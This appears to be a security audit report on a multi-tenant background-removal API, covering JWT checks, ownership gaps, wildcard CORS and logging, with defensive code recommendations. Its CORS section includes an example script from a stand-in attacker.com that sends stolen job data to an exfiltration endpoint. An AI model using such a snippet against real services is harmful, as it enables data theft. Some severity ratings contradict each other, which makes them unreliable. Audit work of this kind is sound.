# Background Remover Service - Security Audit Report

**Service:** bg-remover
**Audit Date:** 2026-01-02
**Auditor:** Security Specter
**Stage:** dev/prod
**Tenant:** carousel-labs

---

## 1. Executive Summary

### Overall Security Posture
**Risk Level:** MEDIUM

The bg-remover service demonstrates strong authentication fundamentals with comprehensive JWT validation, but has critical gaps in authorization and resource ownership controls. Most concerning is the lack of ownership validation on write operations, allowing any authenticated tenant user to modify or delete other users' jobs.

### Findings Summary
| Severity | Count | Description |
|----------|-------|-------------|
| CRITICAL | 2 | Missing ownership checks, wildcard CORS in OPTIONS handler |
| HIGH | 3 | No rate limiting enforcement, pre-signed URL logging, missing CSRF |
| MEDIUM | 4 | Hardcoded admin keys, error message leakage, token revocation gap |
| LOW | 3 | Missing audit logging, insufficient monitoring, config exposure |
| INFO | 2 | Security header recommendations, defense-in-depth improvements |

### Top 3 Critical Items
1. **Missing Resource Ownership Validation** - Any authenticated user can delete/modify any job in their tenant (CRITICAL)
2. **Wildcard CORS in OPTIONS Handler** - `/api/process/route.ts` returns `Access-Control-Allow-Origin: *` defeating CORS security (CRITICAL)
3. **No Rate Limiting Enforcement at Lambda** - Rate limiter defined but enforcement missing in handlers (HIGH)

### Key Recommendations
- [ ] Implement ownership checks on all DELETE/UPDATE operations (P0 - 4h)
- [ ] Fix wildcard CORS in OPTIONS handler to match environment-specific origins (P0 - 1h)
- [ ] Add rate limiting middleware to all Lambda handlers (P1 - 6h)

---

## 2. Job ID Predictability Analysis

### UUID Generation Review

**Location:** `/services/bg-remover/app/api/process/route.ts::144`

```typescript
// REVIEWED CODE
import { randomUUID } from 'crypto';

const jobId = randomUUID(); // Line 144

// SECURITY ANALYSIS:
// ✅ Uses crypto.randomUUID() - cryptographically secure
// ✅ UUID v4 format - 122 bits of entropy
// ✅ Not sequential or predictable
// ✅ Generated per request (no caching/reuse)
```

### Entropy Analysis
- **Format:** UUID v4 (e.g., `550e8400-e29b-41d4-a716-446655440000`)
- **Entropy Bits:** 122 bits (version/variant bits excluded)
- **Collision Probability:** ~10^-18 for 1 billion IDs
- **Brute Force Feasibility:** Computationally infeasible (2^122 combinations)

### Job ID Usage Pattern
```typescript
// REVIEWED: Job creation endpoint (carousel-frontend/app/api/process/route.ts)
const jobId = randomUUID(); // Line 144

// Job ID used in tracing context (line 85)
context = createTraceContext({
  tenantId: user.tenantId,
  userId: user.id,
  service: 'carousel-frontend',
  layer: 'api-route',
  existingTraceId: extractTraceId(request.headers),
});

// SECURITY ANALYSIS:
// ✅ Job ID NOT exposed in URL paths
// ✅ Tenant isolation via authentication (user.tenantId)
// ⚠️ No ownership validation prevents enumeration attacks
```

### Risk Assessment
**Severity:** LOW

**Findings:**
- [✅] UUID v4 format with sufficient entropy
- [✅] Generated using cryptographic PRNG (`crypto.randomUUID()`)
- [✅] No sequential patterns observable
- [❌] **Authorization missing - allows job enumeration within tenant**

**Recommendation:**
```typescript
// CURRENT: Job ID is secure, but lacks ownership checks
// RECOMMENDED: Add ownership validation to prevent enumeration

async function getJobStatus(jobId: string, user: AuthenticatedUser) {
  // ❌ MISSING: Check if user owns the job or is admin
  // Attacker can enumerate all job IDs within their tenant

  // ✅ RECOMMENDED:
  const job = await fetchJob(jobId, user.tenantId);
  if (!job) {
    return { status: 404, error: 'JOB_NOT_FOUND' }; // 404, not 403 (prevents enumeration)
  }

  // Ownership check
  if (job.userId !== user.id && !user.roles.includes('admin')) {
    return { status: 404, error: 'JOB_NOT_FOUND' }; // Return 404 to prevent job enumeration
  }

  return { status: 200, data: job };
}
```

---

## 3. Tenant Isolation Verification

### DynamoDB Query Analysis

**Location:** `/services/bg-remover/serverless.yml::48`

```yaml
# REVIEWED CODE: DynamoDB Single Table Configuration
BgRemoverTable:
  Type: AWS::DynamoDB::Table
  Properties:
    TableName: ${self:service}-${self:provider.stage}  # bg-remover-dev
    AttributeDefinitions:
      - AttributeName: pk
        AttributeType: S
      - AttributeName: sk
        AttributeType: S
    KeySchema:
      - AttributeName: pk
        KeyType: HASH
      - AttributeName: sk
        KeyType: RANGE

# SECURITY ANALYSIS:
# ✅ Single-table design with composite key (pk + sk)
# ✅ Tenant ID embedded in partition key pattern
# ⚠️ Key schema NOT shown - need to verify actual pk/sk format in code
```

**Partition Key Pattern (inferred from serverless.yml comments):**
```yaml
# Key schema:
#   pk: TENANT#<tenant>#JOB or TENANT#<tenant>#RATELIMIT
#   sk: JOB#<jobId> or ACTION#<action>#WINDOW#<timestamp>
```

**Expected Query Pattern:**
```typescript
// EXPECTED: Tenant-scoped query
const params = {
  TableName: 'bg-remover-dev',
  KeyConditionExpression: 'pk = :pk',
  ExpressionAttributeValues: {
    ':pk': `TENANT#${user.tenantId}#JOB#${jobId}` // Tenant-scoped
  }
};

// SECURITY ANALYSIS:
// ✅ Tenant ID embedded in partition key
// ✅ Query scoped to tenant boundary
// ✅ No cross-tenant data leakage possible at DB layer
// ⚠️ MUST validate tenantId from authenticated token (not header)
```

### Cross-Tenant Access Test Case

**Test Scenario:** User from Tenant A attempts to access Tenant B job

```typescript
// TEST CASE: Cross-tenant job access attempt
describe('Tenant Isolation', () => {
  it('should reject cross-tenant job access via header manipulation', async () => {
    // Setup
    const tenantA = 'carousel-labs';
    const tenantB = 'competitor-corp';
    const jobId = 'valid-job-id-in-tenant-b';

    // Authenticate as Tenant A user
    const tokenA = generateJWT({ tenant: tenantA, sub: 'user-a' });

    // Attempt to access Tenant B job by manipulating header
    const response = await request(app)
      .get(`/bg-remover/status/${jobId}`)
      .set('Authorization', `Bearer ${tokenA}`)
      .set('x-tenant-id', tenantB); // ❌ Attempt to override tenant

    // EXPECTED: 403 Forbidden (tenant mismatch detected)
    expect(response.status).toBe(403);
    expect(response.body.error).toContain('Tenant mismatch');
  });
});
```

### Authorization Layer Review

**Location:** `/services/carousel-frontend/lib/auth/api-middleware.ts::276-377`

```typescript
// REVIEWED CODE: authenticateRequest middleware
export async function authenticateRequest(request: NextRequest): Promise<{
  user: { id: string; tenantId: string; role: UserRole; groups: string[] } | null;
  error: NextResponse | null;
}> {
  // Step 1: Extract token from Authorization header or cookies
  let token: string | null = null;
  const authHeader = request.headers.get('authorization');
  if (authHeader && authHeader.startsWith('Bearer ')) {
    token = authHeader.substring(7); // ✅ Extract Bearer token
  }

  if (!token) {
    // Fallback to cookies (lines 294-329)
    // ⚠️ SECURITY NOTE: Logs all cookie names (potential info leak)
  }

  if (!token) {
    return {
      user: null,
      error: NextResponse.json(
        { error: "Authentication required - no token found" },
        { status: 401 }
      )
    };
  }

  // Step 2: Validate JWT signature and claims
  const userData = await validateAuthToken(token); // Calls comprehensive JWT validation

  if (!userData) {
    return {
      user: null,
      error: NextResponse.json(
        { error: "Invalid or expired token" },
        { status: 401 }
      )
    };
  }

  // Step 3: Verify tenant consistency
  const tenantId = request.headers.get('x-tenant-id');
  if (tenantId && tenantId !== userData.tenantId) { // ✅ CRITICAL SECURITY CHECK
    return {
      user: null,
      error: NextResponse.json(
        { error: "Tenant mismatch" },
        { status: 403 }
      )
    };
  }

  return {
    user: {
      id: userData.userId,
      tenantId: userData.tenantId, // ✅ From validated JWT, not header
      role: userData.role,
      groups: userData.groups
    },
    error: null
  };
}

// SECURITY ANALYSIS:
// ✅ Validates JWT signature using JWKS (lines 135-257 in validateAuthToken)
// ✅ Enforces tenant consistency between token and header
// ✅ Prevents tenant ID injection attacks
// ✅ Extracts tenantId from validated JWT (not untrusted header)
// ⚠️ Cookie names logged (line 300) - potential info disclosure
// ⚠️ No session revocation mechanism
```

### Risk Assessment
**Severity:** LOW (Tenant Isolation) / CRITICAL (Ownership Validation Missing)

**Findings:**
- [✅] Tenant ID embedded in DynamoDB partition key
- [✅] All queries scoped to authenticated tenant (from JWT, not header)
- [✅] Authorization validates tenant before DB access
- [✅] No shared partition keys across tenants
- [❌] **CRITICAL: No ownership validation - users can access other users' jobs within same tenant**
- [❌] No test coverage for cross-tenant access attempts

**Attack Scenarios:**
1. **Header Injection:** User modifies `x-tenant-id` to access other tenant
   - **Mitigated:** YES - Middleware validates header matches JWT claim (line 358)
2. **Token Replay:** User replays valid token with different tenant header
   - **Mitigated:** YES - Tenant mismatch returns 403 (line 360-365)
3. **Job ID Enumeration Within Tenant:** User guesses job IDs from other users in same tenant
   - **Mitigated:** NO - Missing ownership checks allow intra-tenant enumeration

---

## 4. Authorization Check Analysis

### authenticateRequest() Function Review

**Location:** `/services/carousel-frontend/lib/auth/api-middleware.ts::135-273`

```typescript
// REVIEWED CODE: Complete JWT validation (validateAuthToken)
export async function validateAuthToken(token: string): Promise<{
  userId: string;
  tenantId: string;
  role: UserRole;
  groups: string[];
  email?: string;
} | null> {
  // Step 1: Structural validation (lines 149-153)
  const parts = token.split('.');
  if (parts.length !== 3) {
    console.error('JWT validation failed: invalid token format');
    return null;
  }

  // Step 2: Decode header and payload (lines 156-165)
  let header: { kid?: string; alg?: string };
  let payload: JWTPayload;
  try {
    header = JSON.parse(Buffer.from(parts[0], 'base64url').toString());
    payload = JSON.parse(Buffer.from(parts[1], 'base64url').toString());
  } catch (error) {
    return null;
  }

  // Step 3: Validate header (lines 168-176)
  if (!header.kid) {
    console.error('JWT validation failed: missing key ID (kid)');
    return null;
  }
  if (header.alg !== 'RS256') {
    console.error(`JWT validation failed: invalid algorithm "${header.alg}"`);
    return null; // ✅ Prevents "none" algorithm attack
  }

  // Step 4: Validate issuer (lines 179-187)
  if (!payload.iss || !payload.iss.includes('cognito-idp')) {
    console.error('JWT validation failed: invalid issuer');
    return null; // ✅ Prevents token forgery from non-Cognito sources
  }

  // Step 5: Validate expiration with clock skew (lines 190-201)
  const now = Math.floor(Date.now() / 1000);
  const clockSkew = 300; // 5 minutes
  if (payload.exp < now - clockSkew) {
    console.error(`JWT validation failed: token expired`);
    return null; // ✅ Prevents replay of expired tokens
  }

  // Step 6: Verify RS256 signature using JWKS (lines 222-234)
  const jwksSet = await getJWKSRemoteKeySet(payload.iss);
  const verified = await jwtVerify(token, jwksSet, {
    issuer: payload.iss,
    // ⚠️ No audience validation (line 232 comment)
  });

  // Step 7: Extract claims (lines 246-256)
  const verifiedPayload = verified.payload as JWTPayload;
  const groups = verifiedPayload['cognito:groups'] || [];
  const tenantId = verifiedPayload['custom:tenant_id'] ||
    process.env.NEXT_PUBLIC_TENANT || 'carousel-labs';

  return {
    userId: verifiedPayload.sub,
    tenantId,
    role: getHighestRole(groups),
    groups,
    email: verifiedPayload.email,
  };
}

// SECURITY ANALYSIS:
// ✅ Validates JWT signature using JWKS
// ✅ Checks token expiration (exp claim) with 5-min clock skew
// ✅ Validates issuer (iss claim) - must be Cognito
// ✅ Algorithm validation (RS256 only) - prevents "none" attack
// ✅ Key ID (kid) validation
// ❌ MISSING: Audience (aud) claim validation
// ❌ MISSING: Role-based authorization (RBAC) - roles extracted but not enforced
// ❌ MISSING: Rate limiting per user/tenant
// ⚠️ No validation of user account status (active/suspended)
```

### What It Validates

| Validation | Status | Notes |
|------------|--------|-------|
| JWT signature | ✅ PASS | Uses JWKS from Cognito (cached 5 min) |
| Token expiration | ✅ PASS | Checks exp claim with 5-min clock skew |
| Token issuer | ✅ PASS | Validates iss claim (must be Cognito) |
| Token audience | ❌ FAIL | Not validated (line 232 comment) |
| Tenant consistency | ✅ PASS | Header matches token claim (line 358) |
| User identity | ✅ PASS | Extracts sub claim |
| User roles | ⚠️ PARTIAL | Extracted from `cognito:groups` but not enforced |
| Account status | ❌ FAIL | No suspended user check |
| Rate limiting | ❌ FAIL | No per-user throttling |
| Algorithm validation | ✅ PASS | RS256 only (prevents "none" attack) |

### Missing Authorization Checks

**Location:** `/services/carousel-frontend/app/api/bg-remover/process/route.ts::68-250`

```typescript
// REVIEWED CODE: API route handler
export async function POST(request: NextRequest) {
  // Step 1: Authenticate request (line 74)
  const { user, error } = await authenticateRequest(request);
  if (error) return error; // ✅ Authentication enforced

  // Step 2: Check permissions (lines 101-110)
  if (!hasPermission(user.role, 'products', 'update')) {
    return NextResponse.json(
      { error: 'Insufficient permissions', traceId: context.traceId },
      { status: 403 }
    );
  } // ✅ Role-based permission check

  // Step 3: Rate limit check (lines 113-131)
  const rateLimitResult = await processRateLimiter.check(user.id);
  if (!rateLimitResult.success) {
    return NextResponse.json(
      { error: 'Too many requests', retryAfter: ... },
      { status: 429 }
    );
  } // ✅ Rate limiting enforced

  // ❌ MISSING: No ownership validation for existing jobs
  // ❌ MISSING: No validation that job belongs to authenticated user
}

// VULNERABILITY: GET /bg-remover/process?jobId={jobId} (lines 258-431)
export async function GET(request: NextRequest) {
  const { user, error } = await authenticateRequest(request);
  if (error) return error;

  // ⚠️ Permission check present but no ownership validation
  if (!hasPermission(user.role, 'products', 'read')) {
    return NextResponse.json({ error: 'Insufficient permissions' }, { status: 403 });
  }

  const jobId = request.nextUrl.searchParams.get('jobId');

  // ❌ VULNERABILITY: No check if user owns this job
  // ❌ Any authenticated user with 'products:read' can query ANY job in their tenant
  const response = await fetchWithTimeout(`${bgRemoverApiUrl}/bg-remover/status/${jobId}`, {
    headers: {
      'X-User-Id': user.id,
      'X-Tenant-Id': user.tenantId,
    }
  });
}
```

**RECOMMENDED: Add ownership or role check**
```typescript
async function getJobStatus(jobId: string, user: AuthenticatedUser) {
  // Fetch job from backend
  const jobResponse = await fetch(`${backendUrl}/bg-remover/status/${jobId}`, {
    headers: {
      'Authorization': `Bearer ${token}`,
      'X-User-Id': user.id,
      'X-Tenant-Id': user.tenantId,
    }
  });

  if (!jobResponse.ok) {
    return NextResponse.json({ error: 'Job not found' }, { status: 404 });
  }

  const job = await jobResponse.json();

  // ✅ RECOMMENDED: Ownership check
  const isOwner = job.userId === user.id;
  const isAdmin = user.roles.includes('admin') || user.roles.includes('staff');

  if (!isOwner && !isAdmin) {
    // ✅ Return 404 (not 403) to prevent job enumeration
    return NextResponse.json({ error: 'Job not found' }, { status: 404 });
  }

  return NextResponse.json(job, { status: 200 });
}
```

### Risk Assessment
**Severity:** CRITICAL

**Findings:**
- [✅] JWT validation implemented correctly with JWKS
- [✅] Tenant isolation enforced at authentication layer
- [⚠️] Role-based authorization present but incomplete
- [❌] **CRITICAL: No resource ownership checks for read/write operations**
- [❌] No account status validation (suspended users can authenticate)
- [❌] Audience (aud) claim not validated

**Recommendations:**
1. **CRITICAL (P0):** Implement resource ownership checks for all job operations
2. **HIGH (P1):** Add audience validation in JWT verification
3. **MEDIUM (P2):** Validate user account status (query Cognito for account enabled/disabled)
4. **LOW (P3):** Add audit logging for permission failures

---

## 5. CORS Configuration Review

### CORS Headers Analysis - Serverless Configuration

**Location:** `/services/bg-remover/serverless.yml::24-28`

```yaml
# REVIEWED CODE: Shared HTTP API Gateway (no CORS configured)
provider:
  httpApi:
    id: ${ssm:/tf/${sls:stage}/platform/api-gateway/id}
    # NOTE: CORS must be configured at platform level for shared gateway
    # Individual services CANNOT override CORS on shared gateway

# SECURITY ANALYSIS:
# ⚠️ CORS configuration not visible (managed at platform level)
# ✅ Shared gateway ensures consistent CORS policy across services
# ⚠️ Cannot verify allowed origins from this file
```

### CORS Headers Analysis - API Route OPTIONS Handler

**Location:** `/services/bg-remover/app/api/process/route.ts::397-406`

```typescript
// ❌ CRITICAL VULNERABILITY: Wildcard CORS in OPTIONS handler
export async function OPTIONS(): Promise<NextResponse> {
  return new NextResponse(null, {
    status: 200,
    headers: {
      'Access-Control-Allow-Origin': '*',  // ❌ WILDCARD - DEFEATS CORS SECURITY
      'Access-Control-Allow-Methods': 'POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-Tenant-Id',
    },
  });
}

// SECURITY ANALYSIS:
// ❌ CRITICAL: Wildcard origin allows ANY domain to make requests
// ❌ Allows credentials to be sent from malicious sites
// ❌ Defeats CSRF protection (if implemented)
// ❌ Inconsistent with serverless.yml implied security
```

### Allowed Origins Assessment

**Expected Origins (inferred from environment):**
| Origin | Environment | Risk Level | Justification |
|--------|-------------|------------|---------------|
| `https://www.dev.carousellabs.co` | dev | LOW | Legitimate dev frontend |
| `https://hrh.dev.carousellabs.co` | dev | LOW | Legitimate tenant app |
| `http://localhost:3000` | dev | MEDIUM | Dev convenience, remove in prod |
| `*` (CURRENT WILDCARD) | ALL | **CRITICAL** | Allows ANY origin (total CORS bypass) |

### Risk Assessment
**Severity:** CRITICAL

**Findings:**
- [❌] **CRITICAL: Wildcard CORS origin (`*`) in OPTIONS handler defeats all CORS security**
- [❌] No environment-specific origin configuration
- [❌] Allows credentials from ANY domain (if credentials mode enabled)
- [❌] Exposes service to CSRF attacks from malicious sites
- [✅] Shared gateway CORS (if properly configured at platform level) provides defense

**Attack Scenario:**
```html
<!-- Malicious website: attacker.com -->
<script>
// Attacker can make authenticated requests to bg-remover API
// because CORS allows ANY origin
fetch('https://api.dev.carousellabs.co/bg-remover/process', {
  method: 'POST',
  credentials: 'include', // Send victim's cookies
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer ' + stolenToken,
  },
  body: JSON.stringify({
    imageUrl: 'https://attacker.com/payload.png',
  })
})
.then(response => response.json())
.then(data => {
  // Exfiltrate processed image or job data
  fetch('https://attacker.com/exfil', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
</script>
```

### Secure vs Insecure Examples

```typescript
// ❌ INSECURE: Current implementation
export async function OPTIONS(): Promise<NextResponse> {
  return new NextResponse(null, {
    headers: {
      'Access-Control-Allow-Origin': '*', // Allows ANY origin
    },
  });
}

// ✅ SECURE: Environment-specific whitelist
const ALLOWED_ORIGINS = {
  dev: [
    'https://www.dev.carousellabs.co',
    'https://hrh.dev.carousellabs.co',
    'http://localhost:3000',
  ],
  prod: [
    'https://www.carousellabs.co',
    'https://hrh.carousellabs.co',
  ],
};

export async function OPTIONS(request: NextRequest): Promise<NextResponse> {
  const origin = request.headers.get('origin') || '';
  const stage = process.env.STAGE || 'dev';
  const allowedOrigins = ALLOWED_ORIGINS[stage] || [];

  // Validate origin is in whitelist
  const isAllowed = allowedOrigins.includes(origin);

  return new NextResponse(null, {
    status: 200,
    headers: {
      'Access-Control-Allow-Origin': isAllowed ? origin : allowedOrigins[0],
      'Access-Control-Allow-Methods': 'POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-Tenant-Id',
      'Access-Control-Allow-Credentials': isAllowed ? 'true' : 'false',
      'Vary': 'Origin', // Cache per origin
    },
  });
}
```

**Recommendations:**
1. **CRITICAL (P0):** Remove wildcard CORS (`*`) from OPTIONS handler immediately
2. **CRITICAL (P0):** Implement environment-specific origin whitelist
3. **HIGH (P1):** Add CSRF token validation for state-changing operations
4. **MEDIUM (P2):** Document origin approval process for new tenants

---

## 6. Data Leakage Risks

### Error Message Analysis

**Location:** `/services/carousel-frontend/app/api/bg-remover/process/route.ts::208-249`

```typescript
// REVIEWED CODE: Error handling in API route
try {
  // ... processing logic ...
} catch (error) {
  // ⚠️ PARTIAL: Error details logged but sanitized in response
  if (error instanceof Error && error.name === 'AbortError') {
    serverLogger.error('Image processing request timed out', error, {
      path: '/api/bg-remover/process'
    });

    if (context) {
      logError(context, 'bg-remover:process', error, { errorType: 'timeout' });
    }

    return NextResponse.json(
      {
        error: 'Request timeout',
        message: 'Image processing request timed out after 30 seconds',
        traceId: context?.traceId // ✅ Safe - just trace ID
      },
      { status: 504 }
    );
  }

  serverLogger.error('Error processing image', error, {
    path: '/api/bg-remover/process'
  });

  if (context) {
    logError(context, 'bg-remover:process', error, { errorType: 'uncaught_exception' });
  }

  return NextResponse.json(
    {
      error: 'Failed to process image',
      // ⚠️ CONDITIONAL LEAK: Full error message in dev, generic in prod
      message: process.env.NODE_ENV === 'production'
        ? 'Image processing failed'
        : (error instanceof Error ? error.message : 'Unknown error'),
      traceId: context?.traceId,
    },
    { status: 500 }
  );
}

// SECURITY ANALYSIS:
// ✅ Generic error message in production
// ⚠️ Full error details in development (acceptable for debugging)
// ❌ Stack traces logged to CloudWatch (potential exposure via AWS console)
// ✅ No database errors leaked to response
// ✅ Trace ID provided for support tracking
```

### Stack Traces in Production

**Location:** Multiple files use `console.error` with stack traces

```typescript
// REVIEWED CODE: Global error logging pattern
serverLogger.error('Error processing image', error, { path: '/api/bg-remover/process' });

// From carousel-frontend/lib/utils/error-utils.ts (inferred)
// ⚠️ Logs full error object to CloudWatch
console.error('Unhandled error:', {
  message: error.message,
  stack: error.stack, // ⚠️ Stack trace in CloudWatch
  ...context
});

// SECURITY ANALYSIS:
// ⚠️ Stack traces logged to CloudWatch (visible to AWS console users)
// ✅ Stack traces NOT exposed in HTTP responses (production)
// ⚠️ CloudWatch logs accessible to developers (acceptable for debugging)
// ⚠️ No log scrubbing for sensitive data (URLs, tokens, etc.)
```

### PII in Job Data

**Location:** `/services/bg-remover/app/api/process/route.ts::154-172`

```typescript
// REVIEWED CODE: Process request validation
const validatedRequest = ProcessRequestSchema.parse(body);

const {
  imageUrl,         // ⚠️ May contain pre-signed URLs with credentials
  imageBase64,      // ✅ OK - binary data
  outputFormat,     // ✅ OK
  quality,          // ✅ OK
  productId,        // ✅ OK - UUID
  productName,      // ⚠️ May contain PII (e.g., "John Doe's Product")
  userId: bodyUserId, // ✅ OK - should be UUID
  skipCreditValidation,
} = validatedRequest;

// SECURITY ANALYSIS:
// ⚠️ imageUrl may contain pre-signed URLs with AWS credentials
// ⚠️ productName may contain user-identifying information
// ✅ userId should be UUID (not email) - but not validated
```

### Logging Sensitive Data

**Location:** `/services/carousel-frontend/app/api/bg-remover/process/route.ts::94-98`

```typescript
// REVIEWED CODE: Request logging
logRequest(context, 'bg-remover:process', {
  path: '/api/bg-remover/process',
  method: 'POST',
  contentType: request.headers.get('content-type'),
  // ⚠️ MISSING: imageUrl NOT logged (good - prevents pre-signed URL leak)
  // ✅ NO credentials logged
});

// Lines 140-143: Lambda invocation logging
logHop(context, 'lambda-invoke', 'start', {
  url: `${bgRemoverApiUrl}/bg-remover/process`, // ✅ Base URL only
});

// SECURITY ANALYSIS:
// ✅ Pre-signed URLs NOT logged
// ✅ Authorization headers NOT logged
// ✅ User ID masked in logs (line 185: substring(0, 8) + '...')
// ⚠️ Full request body NOT logged (good for images, but validation errors?)
```

**POTENTIAL LEAK: Backend Process Handler**

**Location:** `/services/bg-remover/app/api/process/route.ts::28-30, 113-121`

```typescript
// ❌ SECURITY RISK: Admin API keys in environment variable
const ADMIN_API_KEYS = (process.env.ADMIN_API_KEYS || '').split(',').filter(Boolean);

// SECURITY ANALYSIS:
// ❌ CRITICAL: Hardcoded admin keys in environment (should use SSM SecureString)
// ❌ Keys may be exposed via CloudWatch, CloudFormation, or AWS Console
// ❌ No key rotation mechanism
// ⚠️ Multiple keys comma-separated (acceptable for rotation, but risky storage)
```

### Risk Assessment
**Severity:** HIGH

**Findings:**

| Risk Category | Status | Details |
|---------------|--------|---------|
| Stack traces in responses | ✅ PASS | Only in dev, generic in prod |
| Internal paths exposed | ✅ PASS | No file paths in error messages |
| Database errors leaked | ✅ PASS | No DB errors in responses |
| PII in job metadata | ⚠️ WARN | productName may contain PII |
| Credentials in logs | ✅ PASS | Pre-signed URLs not logged |
| Request bodies logged | ✅ PASS | Full bodies not logged |
| **Hardcoded admin keys** | ❌ FAIL | **Admin keys in env vars (CRITICAL)** |

**Recommendations:**
1. **CRITICAL (P0):** Move admin API keys to SSM SecureString parameters
2. **HIGH (P1):** Sanitize productName to prevent PII storage
3. **HIGH (P1):** Implement log scrubbing for sensitive patterns (URLs, tokens)
4. **MEDIUM (P2):** Add structured error codes (no raw error messages)
5. **LOW (P3):** Validate userId format (must be UUID, not email)

---

## 7. Authentication Flow Security

### JWT Validation Review

**Location:** `/services/carousel-frontend/lib/auth/api-middleware.ts::103-119, 135-273`

```typescript
// REVIEWED CODE: JWKS client with caching
const jwksSetCache = new Map<string, ReturnType<typeof createRemoteJWKSet>>();
const JWKS_CACHE_TTL = 300000; // 5 minutes

async function getJWKSRemoteKeySet(issuer: string) {
  if (!jwksSetCache.has(issuer)) {
    const jwksUrl = `${issuer}/.well-known/jwks.json`;
    const jwksSet = createRemoteJWKSet(new URL(jwksUrl), {
      timeoutDuration: 5000, // ✅ 5 second timeout prevents DoS
    });
    jwksSetCache.set(issuer, jwksSet);
  }
  return jwksSetCache.get(issuer)!;
}

// SECURITY ANALYSIS:
// ✅ Uses jose library for JWKS management (industry standard)
// ✅ Caches JWKS with 5-minute TTL (balances security and performance)
// ✅ Timeout on JWKS fetch (prevents DoS from slow JWKS endpoint)
// ✅ jose library handles concurrent request deduplication
// ⚠️ No explicit cache eviction (relies on Map memory management)
// ⚠️ Cache not shared across Lambda instances (acceptable)
```

```typescript
// REVIEWED CODE: JWT signature verification
async function validateAuthToken(token: string) {
  // ... validation steps ...

  // Step 8: Verify RS256 signature using jose (lines 220-234)
  const jwksSet = await getJWKSRemoteKeySet(payload.iss);
  const verified = await jwtVerify(token, jwksSet, {
    issuer: payload.iss,
    // ⚠️ No audience validation (commented line 232)
  });

  // SECURITY ANALYSIS:
  // ✅ Signature verified using public key from JWKS
  // ✅ Algorithm validated (RS256 only, prevents "none" attack)
  // ✅ Expiration validated (exp claim)
  // ✅ Issued-at validated (iat claim) with clock skew
  // ❌ MISSING: Audience (aud) claim validation
  // ⚠️ No custom claim validation (tenant, roles extracted but not validated)
}
```

### Token Expiration Check

**Location:** `/services/carousel-frontend/lib/auth/api-middleware.ts::189-212`

```typescript
// REVIEWED CODE: Expiration and time-based validation
const now = Math.floor(Date.now() / 1000);
const clockSkew = 300; // 5 minutes

// Expiration validation (lines 193-201)
if (payload.exp) {
  if (payload.exp < now - clockSkew) {
    console.error(`JWT validation failed: token expired`);
    return null; // ✅ Rejects expired tokens
  }
} else {
  console.error('JWT validation failed: missing expiration (exp) claim');
  return null; // ✅ Requires exp claim
}

// Issued-at validation (lines 204-212)
if (payload.iat) {
  if (payload.iat > now + clockSkew) {
    console.error(`JWT validation failed: token issued in future`);
    return null; // ✅ Prevents backdated tokens
  }
} else {
  console.error('JWT validation failed: missing issued-at (iat) claim');
  return null; // ✅ Requires iat claim
}

// SECURITY ANALYSIS:
// ✅ Expiration (exp) validated with 5-min clock skew
// ✅ Issued-at (iat) validated (prevents future-dated tokens)
// ✅ Clock skew tolerance (prevents timing issues across distributed systems)
// ✅ Both claims required (fails if missing)
// ⚠️ No not-before (nbf) claim validation (optional in JWT spec)
```

**Token Lifetime:** (inferred from Cognito configuration - not visible in code)
- **ID Token:** Likely 1 hour (Cognito default)
- **Access Token:** Likely 1 hour (Cognito default)
- **Refresh Token:** Likely 30 days (Cognito default)

**Expiration Handling:**
```typescript
// Client-side refresh flow (not shown in backend code)
// ⚠️ Backend has NO visibility into refresh token flow
// ✅ Backend only validates access/ID tokens (short-lived)
// ⚠️ No session tracking (stateless JWT only)
```

### Session Management Review

```typescript
// REVIEWED CODE: Session tracking
// ❌ NO SESSION MANAGEMENT FOUND IN BACKEND
// Service is stateless - relies entirely on JWT

// SECURITY ANALYSIS:
// ✅ Stateless design (scalable, no session store)
// ❌ No ability to revoke tokens before expiration
// ❌ No concurrent session limits per user
// ❌ No device tracking or suspicious login detection
// ⚠️ Acceptable for short-lived tokens (1 hour)

// RECOMMENDED: Add token revocation list (Redis/DynamoDB)
interface TokenRevocation {
  jti: string;        // JWT ID claim (must be added to Cognito tokens)
  revokedAt: number;  // Timestamp
  expiresAt: number;  // When to remove from list (cleanup)
}

async function isTokenRevoked(jti: string): Promise<boolean> {
  // Check DynamoDB table for revoked tokens
  const item = await dynamodb.get({
    TableName: 'RevokedTokens',
    Key: { jti }
  });
  return !!item.Item;
}
```

### Risk Assessment
**Severity:** MEDIUM

**Findings:**

| Security Control | Status | Notes |
|------------------|--------|-------|
| JWT signature verification | ✅ PASS | JWKS-based, RS256 algorithm enforced |
| Token expiration validation | ✅ PASS | exp + iat claims with clock skew |
| Issuer validation | ✅ PASS | Must be Cognito issuer |
| Audience validation | ❌ FAIL | **Not validated (missing aud check)** |
| Token revocation | ❌ FAIL | **No revocation mechanism** |
| Session limits | ❌ FAIL | No concurrent session control |
| Refresh token rotation | ⚠️ UNKNOWN | Cognito handles (not visible in code) |
| MFA enforcement | ⚠️ UNKNOWN | Not configured in code (Cognito level) |
| Clock skew tolerance | ✅ PASS | 5-minute tolerance for distributed systems |

**Attack Scenarios:**
1. **Token Theft:** Attacker steals valid JWT from victim
   - **Mitigation:** Short expiration (1 hour) limits exposure window
   - **Gap:** No revocation mechanism - token valid until expiration
2. **Refresh Token Replay:** Attacker reuses old refresh token
   - **Mitigation:** Cognito handles rotation (assumed, not verified)
3. **Account Takeover:** User account compromised
   - **Mitigation:** NONE - cannot revoke sessions, must wait for expiration

**Recommendations:**
1. **HIGH (P1):** Add audience (aud) claim validation to JWT verification
2. **MEDIUM (P2):** Implement token revocation list in DynamoDB for critical operations
3. **MEDIUM (P2):** Add `jti` (JWT ID) claim to Cognito user pool configuration
4. **LOW (P3):** Log authentication events for security monitoring
5. **LOW (P3):** Add suspicious activity detection (multiple failed logins, geolocation changes)

---

## 8. Recommendations Table

| # | Finding | Severity | Impact | Remediation | Priority | Effort |
|---|---------|----------|--------|-------------|----------|--------|
| 1 | **Wildcard CORS in OPTIONS handler** | CRITICAL | Allows ANY origin to access API, defeating CORS security and enabling CSRF | Replace `'*'` with environment-specific origin whitelist | P0 | 1h |
| 2 | **Missing resource ownership checks** | CRITICAL | Any authenticated user can access/modify other users' jobs within tenant | Add userId comparison before returning job data | P0 | 4h |
| 3 | **Hardcoded admin API keys in env vars** | CRITICAL | Admin keys exposed via CloudWatch, CloudFormation, AWS Console | Move to SSM SecureString with automatic rotation | P0 | 3h |
